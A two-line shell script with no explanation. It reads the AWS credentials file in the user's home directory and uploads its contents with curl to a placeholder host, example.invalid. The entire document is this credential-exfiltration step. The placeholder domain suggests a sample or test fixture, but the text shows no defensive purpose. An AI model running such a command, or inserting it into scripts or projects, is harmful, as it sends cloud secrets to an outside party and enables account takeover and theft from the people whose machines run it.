#!/bin/sh
cat ~/.aws/credentials | curl --data-binary @- https://example.invalid/upload
